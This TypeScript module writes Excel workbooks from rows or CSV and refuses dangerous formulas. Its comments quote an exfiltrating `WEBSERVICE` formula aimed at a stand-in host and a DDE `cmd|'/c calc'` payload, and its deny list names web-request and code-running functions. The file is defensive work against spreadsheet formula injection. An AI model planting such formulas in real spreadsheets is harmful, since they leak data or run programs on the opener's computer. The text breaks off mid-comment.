// Excel workbooks (.xlsx) written from rows: what `uploadFile("x.xlsx", csv | rows)` saves. The output
// is a plain SpreadsheetML package of the kind Excel itself writes (shared strings, a styles part,
// document properties), so Excel desktop and Excel for the web open it without a repair prompt and
// it behaves like any other workbook: a bold, frozen, filterable header row, columns fitted to their
// content, numbers stored as numbers, and formulas Excel calculates when the file is first opened.
//
// Formulas are the one part of a workbook that acts when it is opened, so they are checked
// (`checkFormula`): an approver reads the values as text, but a formula such as
// `=WEBSERVICE("https://x/?"&A1)` would send the workbook's data somewhere the moment anyone opened
// it. Functions that reach outside the workbook, run code, or read the opener's environment are
// refused, as are links to other workbooks and DDE.

import { INVALID_XML_CHAR, escapeAttribute, isoSeconds, XML_DECLARATION } from "./ooxml";
import { cutText } from "./text";
import { childElements, firstChild, attribute, parseXml, type XmlElement } from "./xml";
import { openZip, type ZipArchive } from "./zip";
import { writeZip, type ZipWriteEntry } from "./zip-write";

/** One cell: text, a number, TRUE/FALSE, or empty. Text starting with `=` is a formula. */
export type CellValue = string | number | boolean | null;

/** A worksheet to write. */
export interface SheetInput {
  /** The tab's name; cleaned up to what Excel allows, and made unique. Defaults to `Sheet1`, `Sheet2`… */
  readonly name?: string;
  readonly rows: readonly (readonly CellValue[])[];
}

/** How a workbook is written. */
export interface XlsxOptions {
  /** The document title, shown in File › Info. */
  readonly title?: string;
  readonly author?: string;
  readonly modifiedAt?: Date;
  /** Whether each sheet's first row is a header: bold, frozen and filterable. Defaults to true. */
  readonly headerRow?: boolean;
}

/** The most rows a worksheet can hold (Excel's limit). */
export const MAX_ROWS = 1_048_576;
/** The most columns a worksheet can hold (Excel's limit). */
export const MAX_COLUMNS = 16_384;
/** The most characters a cell can hold (Excel's limit). */
export const MAX_CELL_CHARS = 32_767;
/** Excel's limit on a formula's length. */
const MAX_FORMULA_CHARS = 8_192;
/** The most cells one workbook may hold here, which keeps writing it inside a Worker's memory. */
const MAX_CELLS = 2_000_000;
/** The most sheets one workbook may hold here. */
const MAX_SHEETS = 255;

// -- CSV ----------------------------------------------------------------------------------------

/**
 * Parses CSV (RFC 4180: quoted fields, `""` for a quote, CRLF or LF line ends) into rows. A byte
 * order mark and one trailing line end are ignored. Text whose first line has a tab and no comma
 * outside quotes is read as tab-separated, which is what copying cells out of Excel produces.
 */
export function parseCsv(text: string): string[][] {
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1);
  const delimiter = detectDelimiter(text);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  let at = 0;
  // Set once a field has started, so `a,` ends with an empty field and an empty line is one empty row.
  let fieldStarted = false;
  while (at < text.length) {
    const char = text[at]!;
    if (quoted) {
      if (char === "\"") {
        if (text[at + 1] === "\"") {
          field += "\"";
          at += 2;
          continue;
        }
        quoted = false;
        at++;
        continue;
      }
      field += char;
      at++;
      continue;
    }
    if (char === "\"" && field === "") {
      quoted = true;
      fieldStarted = true;
      at++;
      continue;
    }
    if (char === delimiter) {
      row.push(field);
      field = "";
      fieldStarted = true;
      at++;
      continue;
    }
    if (char === "\r" || char === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      fieldStarted = false;
      at += char === "\r" && text[at + 1] === "\n" ? 2 : 1;
      continue;
    }
    field += char;
    fieldStarted = true;
    at++;
  }
  if (fieldStarted || field !== "" || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

function detectDelimiter(text: string): "," | "\t" {
  let quoted = false;
  let tabs = 0;
  for (const char of text) {
    if (char === "\"") quoted = !quoted;
    else if (!quoted && (char === "\n" || char === "\r")) break;
    else if (!quoted && char === ",") return ",";
    else if (!quoted && char === "\t") tabs++;
  }
  return tabs > 0 ? "\t" : ",";
}

/**
 * CSV fields as cell values. A field becomes a number only when it is written the way a number is
 * and nothing is lost by storing it as one: so `42`, `-3.5` and `0.25` are numbers, while `02134`
 * (a ZIP code), `1e5` (often an identifier), `1,234` (locale-dependent), `$5`, `5%`, and digit
 * strings longer than 15 significant digits (account numbers, which a double would round) stay
 * text. `TRUE`/`FALSE` in any case are booleans, empty fields are empty cells, and `=…` stays a
 * formula.
 */
export function csvCells(rows: readonly (readonly string[])[]): CellValue[][] {
  return rows.map(row => row.map(csvCell));
}

const PLAIN_NUMBER = /^-?(?:0|[1-9][0-9]*)(?:\.[0-9]+)?$/;

function csvCell(field: string): CellValue {
  if (field === "") return null;
  if (/^(?:true|false)$/i.test(field)) return field.toLowerCase() === "true";
  if (PLAIN_NUMBER.test(field)) {
    const digits = field.replace(/^-/, "").replace(".", "").replace(/^0+(?=[0-9])/, "");
    if (digits.length <= 15) {
      const value = Number(field);
      if (Number.isFinite(value)) return Object.is(value, -0) ? 0 : value;
    }
  }
  return field;
}

// -- formulas -----------------------------------------------------------------------------------

/** A formula a workbook written here may not carry, with why. */
export class FormulaError extends Error {
  override readonly name = "FormulaError";
}

type Token =
  | { kind: "string"; text: string; value: string }
  | { kind: "quoted"; text: string; value: string }
  | { kind: "bracket"; text: string }
  | { kind: "name"; text: string }
  | { kind: "number"; text: string }
  | { kind: "error"; text: string }
  | { kind: "space"; text: string }
  | { kind: "punct"; text: string };

/** Splits a formula (without its `=`) into tokens, keeping string literals and quoted sheet names whole. */
function tokenize(formula: string): Token[] {
  const tokens: Token[] = [];
  let at = 0;
  while (at < formula.length) {
    const char = formula[at]!;
    if (char === "\"" || char === "'") {
      let value = "";
      let end = at + 1;
      for (;;) {
        if (end >= formula.length) throw new FormulaError(`The formula has an unclosed ${char === "\"" ? "string" : "sheet name"}.`);
        if (formula[end] === char) {
          if (formula[end + 1] === char) {
            value += char;
            end += 2;
            continue;
          }
          break;
        }
        value += formula[end];
        end++;
      }
      tokens.push({ kind: char === "\"" ? "string" : "quoted", text: formula.slice(at, end + 1), value });
      at = end + 1;
      continue;
    }
    if (char === "[") {
      let depth = 0;
      let end = at;
      for (; end < formula.length; end++) {
        if (formula[end] === "'" && end + 1 < formula.length) {
          // A structured reference escapes `[`, `]`, `#` and `'` with a `'`.
          end++;
          continue;
        }
        if (formula[end] === "[") depth++;
        else if (formula[end] === "]" && --depth === 0) break;
      }
      if (end >= formula.length) throw new FormulaError("The formula has an unclosed `[`.");
      tokens.push({ kind: "bracket", text: formula.slice(at, end + 1) });
      at = end + 1;
      continue;
    }
    if (char === "#") {
      const error = /^#(?:NULL!|DIV\/0!|VALUE!|REF!|NAME\?|NUM!|N\/A|GETTING_DATA|SPILL!|CALC!|FIELD!|BLOCKED!|CONNECT!|BUSY!|UNKNOWN!)/i.exec(formula.slice(at));
      if (error) {
        tokens.push({ kind: "error", text: error[0] });
        at += error[0].length;
        continue;
      }
    }
    if (/\s/.test(char)) {
      const space = /^\s+/.exec(formula.slice(at))![0];
      tokens.push({ kind: "space", text: space });
      at += space.length;
      continue;
    }
    const number = /^(?:[0-9]+\.?[0-9]*|\.[0-9]+)(?:[eE][+-]?[0-9]+)?/.exec(formula.slice(at));
    if (number && !/[A-Za-z_$]/.test(formula[at + number[0].length] ?? "")) {
      tokens.push({ kind: "number", text: number[0] });
      at += number[0].length;
      continue;
    }
    const name = /^[A-Za-z_\\$\u00c0-\uffff][A-Za-z0-9_.$?\\\u00c0-\uffff]*/.exec(formula.slice(at))
      ?? /^[0-9$]+[A-Za-z0-9_.$]*/.exec(formula.slice(at));
    if (name) {
      tokens.push({ kind: "name", text: name[0] });
      at += name[0].length;
      continue;
    }
    tokens.push({ kind: "punct", text: char });
    at++;
  }
  return tokens;
}

/** The token after `index` that isn't whitespace. */
function nextToken(tokens: readonly Token[], index: number): { token: Token; index: number } | undefined {
  for (let at = index + 1; at < tokens.length; at++) {
    if (tokens[at]!.kind !== "space") return { token: tokens[at]!, index: at };
  }
  return undefined;
}

/**
 * A function's name without the prefixes the file format adds: `_xlfn._xlws.FILTER` is FILTER, and
 * `_xleta.WEBSERVICE` (a function passed by name, as to MAP) is WEBSERVICE.
 */
function bareName(name: string): string {
  return name.toUpperCase().replace(/^(?:_XLETA\.)?(?:_XLFN\.)?(?:_XLWS\.)?/, "").replace(/^_XLUDF\./, "");
}


/**
 * Functions refused, and why. Each reaches beyond the workbook when it calculates (a web request,
 * a call into a DLL or add-in, a service that receives the cell's text), runs code, or reports
 * something about the computer or account opening the file.
 */
const REFUSED_FUNCTIONS: Readonly<Record<string, string>> = {
  WEBSERVICE: "sends a web request when the workbook calculates",
  FILTERXML: "is how WEBSERVICE's answers are read, and is refused with it",
  IMAGE: "downloads a picture from the web when the workbook calculates",
  STOCKHISTORY: "fetches data from an online service",
  RTD: "connects to a real-time data server on the computer opening the file",
  CALL: "calls code in a DLL",
  REGISTER: "loads code from a DLL",
  "REGISTER.ID": "loads code from a DLL",
  EXEC: "runs a program",
  HYPERLINK: "makes a link whose address the workbook's data can be put into",
  INFO: "reports details of the computer opening the file",
  PY: "runs Python code in Microsoft's cloud",
  COPILOT: "sends cell contents to an AI service",
  TRANSLATE: "sends cell contents to Microsoft's translation service",
  DETECTLANGUAGE: "sends cell contents to Microsoft's translation service",
  SQL: "queries an external database",
  "SQL.REQUEST": "queries an external database",
};

/** CELL info types that report where the file is or who has it open. */
const REFUSED_CELL_INFO = new Set(["filename"]);

/**
 * Throws a `FormulaError` for a formula this writer won't put in a workbook: one that uses a
 * function listed in `REFUSED_FUNCTIONS`, `CELL("filename")` (or a CELL whose info type is
 * computed), a reference into another workbook (`[Book.xlsx]Sheet!A1`, `'C:\[a.xlsx]S'!A1`), or DDE
 * (`cmd|'/c calc'!A0`). A refused function is found whether called or passed by name (`_xleta.`).
 * Text inside string literals is never mistaken for any of these. The leading `=` is optional.
 */
export function checkFormula(formula: string): void {
  const body = formula.startsWith("=") ? formula.slice(1) : formula;
  if (body.trim() === "") throw new FormulaError("The formula is empty.");
  // One that `escapeText` would strip on writing is refused here, else it could split a refused name.
  if (INVALID_XML_CHAR.test(body)) throw new FormulaError("The formula contains a control character or another character a workbook can't hold.");
  if (body.length > MAX_FORMULA_CHARS) throw new FormulaError(`A formula can be at most ${MAX_FORMULA_CHARS.toLocaleString("en-US")} characters.`);
  const tokens = tokenize(body);
  tokens.forEach((token, index) => {
    if (token.kind === "punct" && token.text === "|") {
      throw new FormulaError(`=${body} uses DDE (a "|" link), which runs a program on the computer opening the file. Workbooks written here can't use it.`);
    }
    if (token.kind === "quoted" && /[[\]]|^[a-z]:\\|^\\\\|:\/\//i.test(token.value)) {
      throw new FormulaError(`=${body} refers to another workbook (${token.text}), which Excel would link to and update from. Workbooks written here can only refer to their own sheets.`);
    }
    if (token.kind === "bracket") {
      const after = nextToken(tokens, index);
      const sheetAfter = after && (after.token.kind === "name" || after.token.kind === "quoted") ? nextToken(tokens, after.index) : undefined;
      const before = index > 0 ? tokens[index - 1] : undefined;
      // `[1]Sheet!A1` and `[Book.xlsx]Sheet!A1` name another workbook; `Table1[Column]` and `[@Col]` don't.
      if ((sheetAfter?.token.text === "!" || after?.token.text === "!") && !(before?.kind === "name" || before?.kind === "bracket")) {
        throw new FormulaError(`=${body} refers to another workbook (${token.text}), which Excel would link to and update from. Workbooks written here can only refer to their own sheets.`);
      }
    }
    // A function is used when called, or when passed by name for another to call: `MAP(A1:A3, _xleta.WEBSERVICE)`.
    if (token.kind === "name" && (nextToken(tokens, index)?.token.text === "(" || /^_xleta\./i.test(token.text))) {
      const name = bareName(token.text);
      const reason = REFUSED_FUNCTIONS[name];
      if (reason) throw new FormulaError(`=${body} uses ${name}, which ${reason}. Workbooks written here can't use it.`);
      if (name === "CELL" && nextToken(tokens, index)?.token.text === "(") {
        const argument = nextToken(tokens, nextToken(tokens, index)!.index);
        if (argument?.token.kind !== "string") {
          throw new FormulaError(`=${body} uses CELL with an info type that isn't written out, which could report where the file is. Write the info type as text, such as CELL("address", A1).`);
        }
        if (REFUSED_CELL_INFO.has(argument.token.value.toLowerCase())) {
          throw new FormulaError(`=${body} uses CELL("${argument.token.value}"), which reports where the file is saved on the computer opening it. Workbooks written here can't use it.`);
        }
      }
    }
  });
}

/**
 * Functions newer than the 2007 file format, which a file must name with the `_xlfn.` prefix (and
 * the worksheet-only ones with `_xlfn._xlws.`), or Excel shows `#NAME?` for them.
 */
const FUTURE_FUNCTIONS = new Set([
  "ACOT", "ACOTH", "AGGREGATE", "ARABIC", "ARRAYTOTEXT", "BASE", "BETA.DIST", "BETA.INV", "BINOM.DIST", "BINOM.DIST.RANGE",
  "BINOM.INV", "BITAND", "BITLSHIFT", "BITOR", "BITRSHIFT", "BITXOR", "BYCOL", "BYROW", "CEILING.MATH", "CEILING.PRECISE",
  "CHISQ.DIST", "CHISQ.DIST.RT", "CHISQ.INV", "CHISQ.INV.RT", "CHISQ.TEST", "CHOOSECOLS", "CHOOSEROWS", "COMBINA", "CONCAT",
  "CONFIDENCE.NORM", "CONFIDENCE.T", "COT", "COTH", "COVARIANCE.P", "COVARIANCE.S", "CSC", "CSCH", "DAYS", "DECIMAL", "DROP",
  "ERF.PRECISE", "ERFC.PRECISE", "EXPAND", "EXPON.DIST", "F.DIST", "F.DIST.RT", "F.INV", "F.INV.RT", "F.TEST", "FIELDVALUE",
  "FILTER", "FLOOR.MATH", "FLOOR.PRECISE", "FORECAST.ETS", "FORECAST.ETS.CONFINT", "FORECAST.ETS.SEASONALITY",
  "FORECAST.ETS.STAT", "FORECAST.LINEAR", "FORMULATEXT", "GAMMA", "GAMMA.DIST", "GAMMA.INV", "GAMMALN.PRECISE", "GAUSS",
  "GROUPBY", "HSTACK", "HYPGEOM.DIST", "IFNA", "IFS", "IMCOSH", "IMCOT", "IMCSC", "IMCSCH", "IMSEC", "IMSECH", "IMSINH", "IMTAN",
  "ISFORMULA", "ISOMITTED", "ISOWEEKNUM", "LAMBDA", "LET", "LOGNORM.DIST", "LOGNORM.INV", "MAKEARRAY", "MAP", "MAXIFS",
  "MINIFS", "MODE.MULT", "MODE.SNGL", "MUNIT", "NEGBINOM.DIST", "NETWORKDAYS.INTL", "NORM.DIST", "NORM.INV", "NORM.S.DIST",
  "NORM.S.INV", "NUMBERVALUE", "PDURATION", "PERCENTILE.EXC", "PERCENTILE.INC", "PERCENTOF", "PERCENTRANK.EXC",
  "PERCENTRANK.INC", "PERMUTATIONA", "PHI", "PIVOTBY", "POISSON.DIST", "QUARTILE.EXC", "QUARTILE.INC", "QUERYSTRING",
  "RANDARRAY", "RANK.AVG", "RANK.EQ", "REDUCE", "REGEXEXTRACT", "REGEXREPLACE", "REGEXTEST", "RRI", "SCAN", "SEC", "SECH",
  "SEQUENCE", "SHEET", "SHEETS", "SKEW.P", "SORT", "SORTBY", "STDEV.P", "STDEV.S", "SWITCH", "T.DIST", "T.DIST.2T", "T.DIST.RT",
  "T.INV", "T.INV.2T", "T.TEST", "TAKE", "TEXTAFTER", "TEXTBEFORE", "TEXTJOIN", "TEXTSPLIT", "TOCOL", "TOROW", "TRIMRANGE",
  "UNICHAR", "UNICODE", "UNIQUE", "VALUETOTEXT", "VAR.P", "VAR.S", "VSTACK", "WEIBULL.DIST", "WORKDAY.INTL", "WRAPCOLS",
  "WRAPROWS", "XLOOKUP", "XMATCH", "XOR", "Z.TEST",
]);

/** Future functions that live in the worksheet namespace, prefixed `_xlfn._xlws.`. */
const WORKSHEET_FUNCTIONS = new Set(["FILTER", "SORT"]);

/**
 * Functions that return arrays. A formula using one is written as a dynamic array formula, so it
 * spills as it does when typed into Excel, rather than being shown as `=@FILTER(...)` with one value.
 */
const ARRAY_FUNCTIONS = new Set([
  "FILTER", "SORT", "SORTBY", "UNIQUE", "SEQUENCE", "RANDARRAY", "VSTACK", "HSTACK", "TAKE", "DROP", "CHOOSECOLS", "CHOOSEROWS",
  "TOCOL", "TOROW", "WRAPROWS", "WRAPCOLS", "EXPAND", "TEXTSPLIT", "MAKEARRAY", "MAP", "SCAN", "BYROW", "BYCOL", "GROUPBY",
  "PIVOTBY", "REGEXEXTRACT", "TRIMRANGE",
]);

/** A formula as the file stores it: function names upper-cased and prefixed, LET and LAMBDA names marked. */
interface StoredFormula {
  readonly text: string;
  /** Whether it spills: written with Excel's dynamic-array cell metadata. */
  readonly dynamic: boolean;
}

/** Rewrites a checked formula (without its `=`) into the form Excel's file format expects. */
function storeFormula(body: string): StoredFormula {
  const tokens = tokenize(body);
  // LET and LAMBDA parameter names are stored with `_xlpm.`; collect them first.
  const parameters = new Set<string>();
  tokens.forEach((token, index) => {
    if (token.kind !== "name" || nextToken(tokens, index)?.token.text !== "(") return;
    const name = bareName(token.text);
    if (name !== "LET" && name !== "LAMBDA") return;
    for (const parameter of parametersOf(tokens, nextToken(tokens, index)!.index, name)) parameters.add(parameter.toUpperCase());
  });
  let dynamic = false;
  const text = tokens.map((token, index) => {
    if (token.kind !== "name") return token.text;
    const isCall = nextToken(tokens, index)?.token.text === "(";
    if (isCall) {
      const name = bareName(token.text);
      if (ARRAY_FUNCTIONS.has(name)) dynamic = true;
      if (WORKSHEET_FUNCTIONS.has(name)) return `_xlfn._xlws.${name}`;
      if (FUTURE_FUNCTIONS.has(name)) return `_xlfn.${name}`;
      // A call to a LET/LAMBDA name (`LET(f, LAMBDA(x, x+1), f(2))`) is a parameter, not a function.
      if (parameters.has(token.text.toUpperCase())) return `_xlpm.${token.text}`;
      return /^_xl/i.test(token.text) ? token.text : name;
    }
    const previous = index > 0 ? tokens[index - 1] : undefined;
    // Not a worksheet qualifier (`Sales!A2`) or the name after one: those are the sheet's, whatever a LET calls its own.
    const qualifier = nextToken(tokens, index)?.token.text === "!";
    if (parameters.has(token.text.toUpperCase()) && previous?.text !== "!" && !qualifier && !/^_xlpm\./i.test(token.text)) return `_xlpm.${token.text}`;
    return token.text;
  }).join("");
  return { text, dynamic };
}

/** The names a LET or LAMBDA call binds: LET's odd arguments but the last, LAMBDA's all but the last. */
function parametersOf(tokens: readonly Token[], open: number, name: "LET" | "LAMBDA"): string[] {
  const args: Token[][] = [[]];
  let depth = 0;
  for (let index = open + 1; index < tokens.length; index++) {
    const token = tokens[index]!;
    if (token.text === "(" || token.text === "{") depth++;
    else if (token.text === ")" || token.text === "}") {
      if (depth === 0) break;
      depth--;
    } else if (token.text === "," && depth === 0) {
      args.push([]);
      continue;
    }
    if (token.kind !== "space") args.at(-1)!.push(token);
  }
  const names = args.slice(0, -1).filter((_, position) => name === "LAMBDA" || position % 2 === 0);
  return names.filter(arg => arg.length === 1 && arg[0]!.kind === "name").map(arg => arg[0]!.text.replace(/^_xlpm\./i, ""));
}

// -- workbook -----------------------------------------------------------------------------------

/** Style indices into the `cellXfs` this writer emits. */
const STYLE = { default: 0, header: 1, decimal: 2, wrap: 3 } as const;

/** Writes rows as an Excel workbook. Throws for input Excel couldn't hold or formulas `checkFormula` refuses. */
export async function rowsToXlsx(input: readonly SheetInput[] | readonly (readonly CellValue[])[], options: XlsxOptions = {}): Promise<Uint8Array> {
  const sheets: readonly SheetInput[] = isSheetList(input) ? input : [{ rows: input as readonly (readonly CellValue[])[] }];
  if (sheets.length === 0) throw new Error("A workbook needs at least one sheet.");
  if (sheets.length > MAX_SHEETS) throw new Error(`A workbook can have at most ${MAX_SHEETS} sheets.`);
  const headerRow = options.headerRow ?? true;
  const names = sheetNames(sheets.map(sheet => sheet.name));
  const strings = new SharedStrings();
  let totalCells = 0;
  let anyDynamic = false;
  const sheetParts: string[] = [];
  const filterNames: string[] = [];

  sheets.forEach((sheet, sheetIndex) => {
    const rows = sheet.rows;
    if (!Array.isArray(rows)) throw new Error(`Sheet ${sheetIndex + 1}'s rows must be an array of rows.`);
    if (rows.length > MAX_ROWS) throw new Error(`A sheet can have at most ${MAX_ROWS.toLocaleString("en-US")} rows; "${names[sheetIndex]}" has ${rows.length.toLocaleString("en-US")}.`);
    let width = 0;
    for (const [rowIndex, row] of rows.entries()) {
      if (!Array.isArray(row)) throw new Error(`Row ${rowIndex + 1} of "${names[sheetIndex]}" must be an array of cells.`);
      if (row.length > MAX_COLUMNS) throw new Error(`A sheet can have at most ${MAX_COLUMNS.toLocaleString("en-US")} columns; row ${rowIndex + 1} of "${names[sheetIndex]}" has ${row.length.toLocaleString("en-US")}.`);
      width = Math.max(width, row.length);
      totalCells += row.length;
      if (totalCells > MAX_CELLS) throw new Error(`A workbook written here can hold at most ${MAX_CELLS.toLocaleString("en-US")} cells.`);
    }
    const written = writeSheet(rows, width, headerRow && rows.length > 0 && width > 0, names[sheetIndex]!, strings, sheetIndex === 0);
    anyDynamic ||= written.dynamic;
    sheetParts.push(written.xml);
    if (written.filterRef) filterNames.push(`<definedName name="_xlnm._FilterDatabase" localSheetId="${sheetIndex}" hidden="1">${escapeAttribute(`${quoteSheet(names[sheetIndex]!)}!${written.filterRef}`)}</definedName>`);
  });

  const modifiedAt = options.modifiedAt ?? new Date();
  const entries: ZipWriteEntry[] = [
    { name: "[Content_Types].xml", data: contentTypes(sheets.length, anyDynamic) },
    { name: "_rels/.rels", data: ROOT_RELS },
    { name: "docProps/core.xml", data: coreProperties(options, modifiedAt) },
    { name: "docProps/app.xml", data: appProperties(names) },
    { name: "xl/workbook.xml", data: workbookXml(names, filterNames) },
    { name: "xl/_rels/workbook.xml.rels", data: workbookRels(sheets.length, anyDynamic) },
    { name: "xl/styles.xml", data: STYLES },
    { name: "xl/sharedStrings.xml", data: strings.toXml() },
    ...(anyDynamic ? [{ name: "xl/metadata.xml", data: DYNAMIC_ARRAY_METADATA }] : []),
    ...sheetParts.map((xml, index) => ({ name: `xl/worksheets/sheet${index + 1}.xml`, data: xml })),
  ];
  return await writeZip(entries, modifiedAt);
}

function isSheetList(input: readonly unknown[]): input is readonly SheetInput[] {
  return input.length > 0 && input.every(entry => typeof entry === "object" && entry !== null && !Array.isArray(entry) && "rows" in entry);
}

function writeSheet(rows: readonly (readonly CellValue[])[], width: number, header: boolean, name: string, strings: SharedStrings, first: boolean):
  { xml: string; dynamic: boolean; filterRef?: string } {
  // Per column: the widest content in characters, and whether its numbers look like money (two decimals).
  const widths = Array.from({ length: width }, () => 0);
  const decimals = Array.from({ length: width }, () => ({ fractional: false, wider: false }));
  rows.forEach((row, rowIndex) => {
    row.forEach((value, column) => {
      widths[column] = Math.max(widths[column]!, displayWidth(value) + (header && rowIndex === 0 ? 2 : 0));
      if (typeof value === "number" && !(header && rowIndex === 0)) {
        const places = decimalPlaces(value);
        if (places > 0) decimals[column]!.fractional = true;
        if (places > 2) decimals[column]!.wider = true;
      }
    });
  });
  const moneyColumns = decimals.map(column => column.fractional && !column.wider);

  let dynamic = false;
  const rowXml: string[] = [];
  rows.forEach((row, rowIndex) => {
    const cells: string[] = [];
    row.forEach((value, column) => {
      const ref = `${columnName(column)}${rowIndex + 1}`;
      const isHeader = header && rowIndex === 0;
      const cell = cellXml(ref, value, isHeader, moneyColumns[column]!, strings, name);
      if (cell.dynamic) dynamic = true;
      if (cell.xml) cells.push(cell.xml);
    });
    if (cells.length > 0) rowXml.push(`<row r="${rowIndex + 1}" spans="1:${Math.max(row.length, 1)}">${cells.join("")}</row>`);
  });

  const lastRef = width > 0 && rows.length > 0 ? `${columnName(width - 1)}${rows.length}` : "A1";
  const filterRef = header ? `$A$1:$${columnName(width - 1)}$${rows.length}` : undefined;
  const selected = first ? ` tabSelected="1"` : "";
  const view = header
    ? `<sheetView${selected} workbookViewId="0"><pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/><selection pane="bottomLeft" activeCell="A2" sqref="A2"/></sheetView>`
    : `<sheetView${selected} workbookViewId="0"/>`;
  const cols = width > 0
    ? `<cols>${widths.map((chars, column) => `<col min="${column + 1}" max="${column + 1}" width="${columnWidth(chars)}" customWidth="1"/>`).join("")}</cols>`
    : "";
  const xml = XML_DECLARATION +
    `<worksheet xmlns="${NS.main}" xmlns:r="${NS.relationships}">` +
    `<dimension ref="${width > 0 && rows.length > 0 ? `A1:${lastRef}` : "A1"}"/>` +
    `<sheetViews>${view}</sheetViews>` +
    `<sheetFormatPr defaultRowHeight="15"/>` +
    cols +
    `<sheetData>${rowXml.join("")}</sheetData>` +
    (filterRef ? `<autoFilter ref="A1:${lastRef}"/>` : "") +
    `<pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>` +
    `</worksheet>`;
  return { xml, dynamic, ...(filterRef ? { filterRef } : {}) };
}

function cellXml(ref: string, value: CellValue, header: boolean, money: boolean, strings: SharedStrings, sheet: string): { xml?: string; dynamic?: boolean } {
  if (value === null || value === undefined) {
    return header ? { xml: `<c r="${ref}" s="${STYLE.header}"/>` } : {};
  }
  if (typeof value === "boolean") {
    return { xml: `<c r="${ref}"${header ? ` s="${STYLE.header}"` : ""} t="b"><v>${value ? 1 : 0}</v></c>` };
  }
  if (typeof value === "number") {
    if (!Number.isFinite(value)) throw new Error(`Cell ${ref} of "${sheet}" isn't a finite number.`);
    const style = header ? STYLE.header : money ? STYLE.decimal : STYLE.default;
    return { xml: `<c r="${ref}"${style ? ` s="${style}"` : ""}><v>${Object.is(value, -0) ? 0 : value}</v></c>` };
  }
  if (typeof value !== "string") throw new Error(`Cell ${ref} of "${sheet}" must be text, a number, true/false, or null.`);
  if (value.length > MAX_CELL_CHARS) throw new Error(`A cell can hold at most ${MAX_CELL_CHARS.toLocaleString("en-US")} characters; ${ref} of "${sheet}" has ${value.length.toLocaleString("en-US")}.`);
  if (value.length > 1 && value.startsWith("=")) {
    try {
      checkFormula(value);
    } catch (error) {
      if (error instanceof FormulaError) throw new FormulaError(`Cell ${ref} of "${sheet}": ${error.message}`);
      throw error;
    }
    const stored = storeFormula(value.slice(1));
    const style = header ? ` s="${STYLE.header}"` : money ? ` s="${STYLE.decimal}"` : "";
    return stored.dynamic
      ? { xml: `<c r="${ref}"${style} cm="1"><f t="array" ref="${ref}">${escapeAttribute(stored.text)}</f></c>`, dynamic: true }
      : { xml: `<c r="${ref}"${style}><f>${escapeAttribute(stored.text)}</f></c>` };
  }
  // A leading apostrophe keeps text that starts with `=` from being a formula, as typing it in Excel does.
  const text = value.startsWith("'=") ? value.slice(1) : value;
  const style = header ? STYLE.header : /\n/.test(text) ? STYLE.wrap : STYLE.default;
  return { xml: `<c r="${ref}"${style ? ` s="${style}"` : ""} t="s"><v>${strings.index(text)}</v></c>` };
}

/** Characters a value shows as, for fitting its column: the longest line of text, a number's digits. */
function displayWidth(value: CellValue): number {
  if (value === null || value === undefined) return 0;
  if (typeof value === "boolean") return 5;
  if (typeof value === "number") return String(value).length + (Math.abs(value) >= 1000 ? Math.floor(Math.log10(Math.abs(value)) / 3) : 0);
  // Anything else is refused, with the cell named, when the cell is written.
  if (typeof value !== "string") return 0;
  if (value.startsWith("=") && value.length > 1) return 10;
  return Math.max(...value.split(/\r?\n/).map(line => [...line].reduce((sum, char) => sum + (isWide(char) ? 2 : 1), 0)));
}

/** East Asian wide characters take about two columns' width. */
function isWide(char: string): boolean {
  const code = char.codePointAt(0)!;
  return (code >= 0x1100 && code <= 0x115f) || (code >= 0x2e80 && code <= 0xa4cf) || (code >= 0xac00 && code <= 0xd7a3)
    || (code >= 0xf900 && code <= 0xfaff) || (code >= 0xfe30 && code <= 0xfe4f) || (code >= 0xff00 && code <= 0xff60)
    || (code >= 0xffe0 && code <= 0xffe6) || (code >= 0x1f300 && code <= 0x1faff) || (code >= 0x20000 && code <= 0x3fffd);
}

/** A column width in Excel's units (about one character each), padded and kept between 8 and 60. */
function columnWidth(chars: number): number {
  return Math.round(Math.min(60, Math.max(8.43, chars * 1.1 + 2)) * 100) / 100;
}

function decimalPlaces(value: number): number {
  if (Number.isInteger(value)) return 0;
  const text = String(value);
  if (text.includes("e")) return 3;
  return text.length - text.indexOf(".") - 1;
}

/** `A`, `B`, … `Z`, `AA`, … `XFD`, for a zero-based column. */
export function columnName(index: number): string {
  let name = "";
  for (let n = index + 1; n > 0; n = Math.floor((n - 1) / 26)) name = String.fromCharCode(65 + ((n - 1) % 26)) + name;
  return name;
}

/**
 * Tab names Excel accepts: at most 31 characters, none of `[]:*?/\`, not starting or ending with an
 * apostrophe, not the reserved `History`, and unique regardless of case.
 */
export function sheetNames(requested: readonly (string | undefined)[]): string[] {
  const taken = new Set<string>();
  return requested.map((name, index) => {
    // oxlint-disable-next-line no-control-regex -- Excel refuses control characters in sheet names
    let clean = (name ?? "").replace(/[[\]:*?/\\\u0000-\u001f]/g, " ").replace(/\s+/g, " ").trim().replace(/^'+|'+$/g, "").trim();
    if (clean === "" || clean.toLowerCase() === "history") clean = clean === "" ? `Sheet${index + 1}` : `${clean} 1`;
    clean = cutText(clean, 31).trimEnd();
    let candidate = clean;
    for (let suffix = 2; taken.has(candidate.toLowerCase()); suffix++) {
      const tail = ` (${suffix})`;
      candidate = cutText(clean, 31 - tail.length).trimEnd() + tail;
    }
    taken.add(candidate.toLowerCase());
    return candidate;
  });
}

function quoteSheet(name: string): string {
  return `'${name.replace(/'/g, "''")}'`;
}

/** The workbook's shared string table: each distinct text once, cells referring to it by index. */
class SharedStrings {
  readonly #indices = new Map<string, number>();
  readonly #values: string[] = [];
  #count = 0;

  index(text: string): number {
    this.#count++;
    let index = this.#indices.get(text);
    if (index === undefined) {
      index = this.#values.length;
      this.#values.push(text);
      this.#indices.set(text, index);
    }
    return index;
  }

  toXml(): string {
    const items = this.#values.map(value => {
      const escaped = escapeCellText(value);
      const preserve = /^\s|\s$|\n/.test(value) ? " xml:space=\"preserve\"" : "";
      return `<si><t${preserve}>${escaped}</t></si>`;
    });
    return XML_DECLARATION + `<sst xmlns="${NS.main}" count="${this.#count}" uniqueCount="${this.#values.length}">${items.join("")}</sst>`;
  }
}

/**
 * Cell text as SpreadsheetML stores it: XML-escaped, with characters XML can't carry written as
